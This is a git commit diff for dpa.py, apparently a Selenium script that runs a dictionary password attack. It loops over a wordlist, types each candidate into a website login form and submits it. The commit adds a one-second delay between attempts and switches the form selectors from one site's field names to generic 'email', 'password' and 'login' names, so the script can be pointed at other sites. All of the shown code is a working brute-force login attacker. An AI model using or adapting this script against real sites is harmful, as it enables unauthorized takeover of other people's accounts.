123f60e0185c2a8ef2ee231133d1e699c3b27d36
Mohammad Hossein Arab <mohammadhosseinarab110@gmail.com>
2023-02-17 11:55:25 +0330

    sync with  mharab110 / dpa

--- dpa.py
+++ dpa.py
@@ -32,15 +32,16 @@ dictionary = open(dictionary_address)
 print("Founding")
 for line in dictionary:
     # only for design
+    sleep(1)
     sys.stdout.write(".")
     sys.stdout.flush()
 
     driver.get(url_to_login)
-    setusername = driver.find_element(by=By.NAME, value="username-80") # you need to replace number of it (80) according to your own site
+    setusername = driver.find_element(by=By.NAME, value="email") # you need to replace number of it (80) according to your own site
     setusername.send_keys(username)
-    setpassword = driver.find_element(by=By.ID, value="user_password-80") # you need to replace number of it (80) according to your own site
+    setpassword = driver.find_element(by=By.NAME, value="password") # you need to replace number of it (80) according to your own site
     setpassword.send_keys(line[:-1])
-    submit = driver.find_element(by=By.ID, value="um-submit-btn")
+    submit = driver.find_element(by=By.NAME, value="login")
     submit.click()
 
     # check the correctness of the password
